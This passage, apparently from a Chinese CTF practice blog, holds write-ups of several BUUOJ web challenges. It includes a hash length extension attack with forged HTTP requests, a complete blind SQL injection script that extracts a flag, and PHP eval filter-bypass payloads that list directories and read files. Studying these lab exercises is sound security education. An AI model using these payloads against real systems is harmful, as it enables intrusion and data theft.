<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">'latin1'</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, action, param, sign, ip)</span>:</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):          <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span><span class="params">(self)</span>:</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"scan"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'w'</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">"Connection Timeout"</span>):</span><br><span class="line">                    result[<span class="string">'data'</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    print(resp)</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"read"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'r'</span>)</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">'data'</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">'code'</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">'data'</span>] = <span class="string">"Action Error"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">'msg'</span>] = <span class="string">"Sign Error"</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):  <span class="comment">#对secert_key、param、action进行MD5运算  的结果与self.sign作比较</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route("/geneSign", methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span><span class="params">()</span>:</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))  <span class="comment"># urllib.unquote 相当与  urldecode</span></span><br><span class="line">    action = <span class="string">"scan"</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/De1ta',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span><span class="params">()</span>:</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">"action"</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">"sign"</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"No Hacker!!!!"</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">"code.txt"</span>,<span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(param)</span>:</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Connection Timeout"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span><span class="params">(action, param)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest() <span class="comment">#对secert_key、param、action进行MD5摘要签名</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(param)</span>:</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">"gopher"</span>) <span class="keyword">or</span> check.startswith(<span class="string">"file"</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>

<p>分析代码，总共三条路由，<code>@app.route(&#39;/&#39;)</code>显示代码，<code>@app.route(&quot;/geneSign&quot;, methods=[&#39;GET&#39;, &#39;POST&#39;])</code>生成签名，<code>@app.route(&#39;/De1ta&#39;,methods=[&#39;GET&#39;,&#39;POST&#39;])</code>获取参数并执行<code>Exec()</code>函数</p>
<p>大概思路就是在 /De1ta 中 get param ，cookie action sign 去读取 flag.txt，其中，<code>param=flag.txt</code>，<code>action</code> 中要含有 <code>read</code> 和 <code>scan</code>，且 <code>sign=md5(secert_key + param + action)</code></p>
<p>在<code>getSign</code>函数中，生成MD5签名的方式是<code>secert_key + param + action</code>其中<code>action=scan</code>，<code>secert_key</code>未知<code>param</code>可以控制。</p>
<p>在<code>@app.route(&#39;/De1ta&#39;,methods=[&#39;GET&#39;,&#39;POST&#39;])</code>中，<code>cookies</code>中的<code>action</code>必须为<code>readscan</code>，sign为</p>
<p><code>secert_key + param + scan</code>签名后的md5，使<code>param=flag.txtread</code>直接获取到签名后的md5。</p>
<h3 id="0x02-开始操作"><a href="#0x02-开始操作" class="headerlink" title="0x02 开始操作"></a>0x02 开始操作</h3><p>先获取到签名后的md5</p>
<p>访问<code>http://35905e74-da20-4673-b384-8c4686fa85c2.node3.buuoj.cn/geneSign?param=flag.txtread</code></p>
<p>返回为<code>0155303824bd0738b4ed0a52b7446c08</code></p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/De1ta?param=flag.txt</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 35905e74-da20-4673-b384-8c4686fa85c2.node3.buuoj.cn</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Cookie</span>: action=readscan; sign=0155303824bd0738b4ed0a52b7446c08</span><br></pre></td></tr></table></figure>

<p>结果</p>
<p><code>{&quot;code&quot;: 200, &quot;data&quot;: &quot;flag{04726554-0f9f-47f4-9c1a-114e21e68594}\n&quot;}</code></p>
<h3 id="0x02-另一种解法"><a href="#0x02-另一种解法" class="headerlink" title="0x02 另一种解法"></a>0x02 另一种解法</h3><p>使用hashdump 利用哈希长度扩展攻击，</p>
<p>已知<code>（secret+flag.txt+scan）=40ad0bf20e771e768e9305810410c1b9</code></p>
<p>求<code>（secret+flag.txt+scanread）</code></p>
<p>经过测试密钥是16位 加上scanread是24位。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:/tmp/HashPump<span class="comment"># hashpump </span></span><br><span class="line">Input Signature: 40ad0bf20e771e768e9305810410c1b9</span><br><span class="line">Input Data: scan   <span class="comment">#写上原有数据</span></span><br><span class="line">Input Key Length: 24    <span class="comment">#密钥长度+数据长度+拓展的数据长度</span></span><br><span class="line">Input Data to Add: <span class="built_in">read</span>   <span class="comment">#拓展的数据</span></span><br><span class="line">46a6ff04f7bede58de30e93410935976 <span class="comment">#生成的MD5</span></span><br><span class="line">scan\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe0\x00\x00\x00\x00\x00\x00\x00read</span><br></pre></td></tr></table></figure>

<p><code>burp suite</code>提交的数据</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/De1ta?param=flag.txt</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 6e84dbce-e560-4f27-86f2-54cb202c45fe.node3.buuoj.cn</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line">Cookie:action=scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%e0%00%00%00%00%00%00%00read;sign=46a6ff04f7bede58de30e93410935976</span><br></pre></td></tr></table></figure>

<p>结果<code>{&quot;code&quot;: 200, &quot;data&quot;: &quot;flag{6cd67cbd-fdfb-45cc-8654-52766ef0635a}\n&quot;}</code></p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>ctf</tag>
        <tag>buuctf</tag>
        <tag>De1CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>buuoj刷题记录3</title>
    <url>/2019/12/27/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%953/</url>
    <content><![CDATA[<h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><h3 id="0x00-基础"><a href="#0x00-基础" class="headerlink" title="0x00 基础"></a>0x00 基础</h3><p>SQL盲注，使用<code>if(表达式1，表达式2，表达式3)、ascii(char)、substr（str,pos,len）</code>函数一个一个的猜字符，过滤绕过，空格可以使用<code>+、\t、/**/、()</code>绕过。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if(表达式1，表达式2，表达式3)  如果表达式1的值为真，取表达式二的值，否者取表达式三的值</span><br><span class="line">ascii(char)</span><br><span class="line">substr（str,pos,len)</span><br></pre></td></tr></table></figure>
<a id="more"></a>

<h3 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h3><p>题目提示</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;&#125; 里为 uuid</span><br></pre></td></tr></table></figure>

<p>访问页面</p>
<p><img src="/pic/3.jpg" alt=""></p>
<p>使用burp suite进行sql fuzz测试，以下字符被过滤</p>
<table>
<thead>
<tr>
<th align="center">%20</th>
<th>482</th>
<th>SQL Injection Checked</th>
</tr>
</thead>
<tbody><tr>
<td align="center">AND</td>
<td>482</td>
<td>SQL Injection Checked</td>
</tr>
<tr>
<td align="center">DELETE</td>
<td>482</td>
<td>SQL Injection Checked</td>
</tr>
<tr>
<td align="center">END-EXEC</td>
<td>482</td>
<td>SQL Injection Checked</td>
</tr>
<tr>
<td align="center">GROUP</td>
<td>482</td>
<td>SQL Injection Checked</td>
</tr>
<tr>
<td align="center">INSERT</td>
<td>482</td>
<td>SQL Injection Checked</td>
</tr>
<tr>
<td align="center">INTO</td>
<td>482</td>
<td>SQL Injection Checked</td>
</tr>
<tr>
<td align="center">LIMIT</td>
<td>482</td>
<td>SQL Injection Checked</td>
</tr>
<tr>
<td align="center">OR</td>
<td>482</td>
<td>SQL Injection Checked</td>
</tr>
<tr>
<td align="center">UNION</td>
<td>482</td>
<td>SQL Injection Checked</td>
</tr>
<tr>
<td align="center">UPDATE</td>
<td>482</td>
<td>SQL Injection Checked</td>
</tr>
<tr>
<td align="center">+</td>
<td>482</td>
<td>SQL Injection Checked</td>
</tr>
<tr>
<td align="center">/</td>
<td>482</td>
<td>SQL Injection Checked</td>
</tr>
<tr>
<td align="center">-</td>
<td>482</td>
<td>SQL Injection Checked</td>
</tr>
<tr>
<td align="center">*</td>
<td>482</td>
<td>SQL Injection Checked</td>
</tr>
<tr>
<td align="center">`</td>
<td>482</td>
<td>SQL Injection Checked</td>
</tr>
<tr>
<td align="center">“</td>
<td>482</td>
<td>SQL Injection Checked</td>
</tr>
<tr>
<td align="center">||</td>
<td>482</td>
<td>SQL Injection Checked</td>
</tr>
<tr>
<td align="center">&amp;&amp;</td>
<td>482</td>
<td>SQL Injection Checked</td>
</tr>
<tr>
<td align="center">%23</td>
<td>482</td>
<td>SQL Injection Checked</td>
</tr>
<tr>
<td align="center">;</td>
<td>482</td>
<td>SQL Injection Checked</td>
</tr>
<tr>
<td align="center"><code>if,substr,ascii,&lt;,&gt;,=,(),/t</code>都没有被过滤，可以使用盲注,编写脚本，空格被过滤使用<code>/t、( )代替</code></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h3 id="0x02-开始操作"><a href="#0x02-开始操作" class="headerlink" title="0x02 开始操作"></a>0x02 开始操作</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 12/27/2019 6:11 PM</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://97d580f3-633c-469e-826c-3e251279ebba.node3.buuoj.cn/index.php"</span></span><br><span class="line">result = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">43</span>):</span><br><span class="line">    high = <span class="number">126</span></span><br><span class="line">    low = <span class="number">45</span></span><br><span class="line">    mid = (low + high) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> high - low &gt; <span class="number">1</span>:</span><br><span class="line">        payload = <span class="string">"if(ascii(substr((select(flag)from(flag)),%d,1))&gt;%d,1,2)"</span> % (x, mid)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">"id"</span>: payload</span><br><span class="line">        &#125;</span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        res = requests.post(url, data = data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Hello'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            low = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> high - low == <span class="number">1</span>:</span><br><span class="line">        payload = <span class="string">"if(ascii(substr((select(flag)from(flag)),%d,1))=%d,1,2)"</span> % (x, high)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">"id"</span>: payload</span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Hello'</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            result += chr(int(mid+<span class="number">1</span>))</span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            result += chr(int(mid))</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        result += chr(int(mid))</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">f</span><br><span class="line">fl</span><br><span class="line">fla</span><br><span class="line">flag</span><br><span class="line">flag&#123;</span><br><span class="line">flag&#123;a</span><br><span class="line">flag&#123;a2</span><br><span class="line">flag&#123;a22</span><br><span class="line">flag&#123;a22c</span><br><span class="line">flag&#123;a22cf</span><br><span class="line">flag&#123;a22cf6</span><br><span class="line">flag&#123;a22cf69</span><br><span class="line">flag&#123;a22cf690</span><br><span class="line">flag&#123;a22cf690-</span><br><span class="line">flag&#123;a22cf690-3</span><br><span class="line">flag&#123;a22cf690-34</span><br><span class="line">flag&#123;a22cf690-342</span><br><span class="line">flag&#123;a22cf690-342a</span><br><span class="line">flag&#123;a22cf690-342a-</span><br><span class="line">flag&#123;a22cf690-342a-4</span><br><span class="line">flag&#123;a22cf690-342a-4b</span><br><span class="line">flag&#123;a22cf690-342a-4bf</span><br><span class="line">flag&#123;a22cf690-342a-4bf4</span><br><span class="line">flag&#123;a22cf690-342a-4bf4-</span><br><span class="line">flag&#123;a22cf690-342a-4bf4-8</span><br><span class="line">flag&#123;a22cf690-342a-4bf4-88</span><br><span class="line">flag&#123;a22cf690-342a-4bf4-885</span><br><span class="line">flag&#123;a22cf690-342a-4bf4-885b</span><br><span class="line">flag&#123;a22cf690-342a-4bf4-885b-</span><br><span class="line">flag&#123;a22cf690-342a-4bf4-885b<span class="_">-d</span></span><br><span class="line">flag&#123;a22cf690-342a-4bf4-885b-df</span><br><span class="line">flag&#123;a22cf690-342a-4bf4-885b-df3</span><br><span class="line">flag&#123;a22cf690-342a-4bf4-885b-df33</span><br><span class="line">flag&#123;a22cf690-342a-4bf4-885b-df332</span><br><span class="line">flag&#123;a22cf690-342a-4bf4-885b-df332d</span><br><span class="line">flag&#123;a22cf690-342a-4bf4-885b-df332d4</span><br><span class="line">flag&#123;a22cf690-342a-4bf4-885b-df332d44</span><br><span class="line">flag&#123;a22cf690-342a-4bf4-885b-df332d446</span><br><span class="line">flag&#123;a22cf690-342a-4bf4-885b-df332d4469</span><br><span class="line">flag&#123;a22cf690-342a-4bf4-885b-df332d44698</span><br><span class="line">flag&#123;a22cf690-342a-4bf4-885b-df332d44698d</span><br><span class="line">flag&#123;a22cf690-342a-4bf4-885b-df332d44698d&#125;</span><br></pre></td></tr></table></figure>

<p>因为平台有访问频率限制，导致之前很多次都不成功，加入时间模块稍微延迟一下即可。</p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>ctf</tag>
        <tag>buuctf</tag>
        <tag>ciscn</tag>
      </tags>
  </entry>
  <entry>
    <title>buuoj刷题记录2</title>
    <url>/2019/12/26/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/</url>
    <content><![CDATA[<h2 id="Roarctf-easy-calc"><a href="#Roarctf-easy-calc" class="headerlink" title="[Roarctf]easy_calc"></a>[Roarctf]easy_calc</h2><h3 id="0x00-基础"><a href="#0x00-基础" class="headerlink" title="0x00 基础"></a>0x00 基础</h3><p>php内置读取文件内容函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">file_get_contents()</span><br><span class="line">readfile()</span><br><span class="line">file()</span><br></pre></td></tr></table></figure>

<p>目录扫描函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">scandir()</span><br></pre></td></tr></table></figure>

<a id="more"></a>

<p>字符转换函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">hex2bin(<span class="string">"979797"</span>)-&gt;<span class="string">"aaa"</span></span><br><span class="line">chr(<span class="number">95</span>)-&gt;<span class="string">"a"</span></span><br></pre></td></tr></table></figure>

<p>输出函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">var_dump()</span><br><span class="line">printf()</span><br></pre></td></tr></table></figure>

<p><code>parse_str</code>函数通常被自动应用于<code>get</code>、<code>post</code>请求和<code>cookie</code>中。使用<code>parse_str</code>解析规则绕过waf</p>
<h3 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h3><p>查看源码，发现calc.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    $(<span class="string">'#calc'</span>).submit(<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">            url:<span class="string">"calc.php?num="</span>+encodeURIComponent($(<span class="string">"#content"</span>).val()),</span><br><span class="line">            type:<span class="string">'GET'</span>,</span><br><span class="line">            success:<span class="function"><span class="keyword">function</span><span class="params">(data)</span></span>&#123;</span><br><span class="line">                $("#result").html(`&lt;div class="alert alert-success"&gt;</span><br><span class="line">            &lt;strong&gt;答案:&lt;/strong&gt;$&#123;data&#125;</span><br><span class="line">            &lt;/div&gt;`);</span><br><span class="line">            &#125;,</span><br><span class="line">            error:<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span><br><span class="line">                alert(<span class="string">"这啥?算不来!"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>进入calc.php,进行代码审计。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $str = $_GET[<span class="string">'num'</span>];</span><br><span class="line">        $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>,<span class="string">'\$'</span>,<span class="string">'\\'</span>,<span class="string">'\^'</span>];</span><br><span class="line">        <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $str)) &#123;    </span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">"what are you want to do?"</span>);<span class="comment">//如果包含黑名单中的字符，程序退出</span></span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">'echo '</span>.$str.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="0x02-开始操作"><a href="#0x02-开始操作" class="headerlink" title="0x02 开始操作"></a>0x02 开始操作</h3><p>传入<code>1+1</code> 显示<code>403 Forbidden</code> 传入<code>1%2b1</code>就可以。必须传入url编码后的。查看<code>phpinfo()</code>，也是<code>403 Forbidden</code>，利用PHP自动解析函数<code>parser_str()</code>绕过，详细介绍查看<a href="https://www.freebuf.com/articles/web/213359.html" target="_blank" rel="noopener">参考连接</a>。</p>
<p>扫描目录使用<code>scandir()</code>因为<code>/ &#39;  &quot;</code>被过滤无法直接使用<code>/</code>，使用<code>chr()</code>转换payload= <code>?+num=print_r(scandir(chr(47)))</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Array</span> ( [<span class="number">0</span>] =&gt; . [<span class="number">1</span>] =&gt; .. [<span class="number">2</span>] =&gt; .dockerenv [<span class="number">3</span>] =&gt; bin [<span class="number">4</span>] =&gt; boot [<span class="number">5</span>] =&gt; dev [<span class="number">6</span>] =&gt; etc [<span class="number">7</span>] =&gt; f1agg [<span class="number">8</span>] =&gt; home [<span class="number">9</span>] =&gt; lib [<span class="number">10</span>] =&gt; lib64 [<span class="number">11</span>] =&gt; media [<span class="number">12</span>] =&gt; mnt [<span class="number">13</span>] =&gt; opt [<span class="number">14</span>] =&gt; proc [<span class="number">15</span>] =&gt; root [<span class="number">16</span>] =&gt; run [<span class="number">17</span>] =&gt; sbin [<span class="number">18</span>] =&gt; srv [<span class="number">19</span>] =&gt; start.sh [<span class="number">20</span>] =&gt; sys [<span class="number">21</span>] =&gt; tmp [<span class="number">22</span>] =&gt; usr [<span class="number">23</span>] =&gt; <span class="keyword">var</span> ) <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>使用PHP内置函数获<code>file_get_contents()</code>获取文件内容payload=<code>?+num=printf(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;d09c31b7-d1a1-45a2-b35b-65452a1335ef&#125; 43</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>ctf</tag>
        <tag>buuctf</tag>
        <tag>Roarctf</tag>
      </tags>
  </entry>
  <entry>
    <title>buuoj刷题记录1</title>
    <url>/2019/12/23/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/</url>
    <content><![CDATA[<h2 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h2><h3 id="0x00-基础"><a href="#0x00-基础" class="headerlink" title="0x00 基础"></a>0x00 基础</h3><p>一般文件的目录又xxx.php.bak/swp，或者查看元素、robots.txt里面有提示，或者<code>www.zip</code>等一系列文件中出现网站源码。也可以使用工具扫描</p>
<p>PHP序列化<a href="https://www.php.cn/php-notebook-239422.html" target="_blank" rel="noopener">参考文章</a></p>
<a id="more"></a>

<h3 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h3><p>题中<code>www.zip</code>中包含源码，下载<del>后进行代码审计（不会）</del>翻阅PHP手册，各种百度。在config.php中包含flag，要想办法获取到此文件<br>config.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $config[<span class="string">'hostname'</span>] = <span class="string">'127.0.0.1'</span>;</span><br><span class="line">    $config[<span class="string">'username'</span>] = <span class="string">'root'</span>;</span><br><span class="line">    $config[<span class="string">'password'</span>] = <span class="string">''</span>;</span><br><span class="line">    $config[<span class="string">'database'</span>] = <span class="string">''</span>;</span><br><span class="line">    $flag = <span class="string">''</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>查看index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>($user-&gt;login($username, $password)) &#123;</span><br><span class="line">			$_SESSION[<span class="string">'username'</span>] = $username;</span><br><span class="line">			header(<span class="string">'Location: profile.php'</span>);<span class="comment">//登入后跳转到profile.php</span></span><br><span class="line">			<span class="keyword">exit</span>;	</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>

<p>查看profile.php</p>
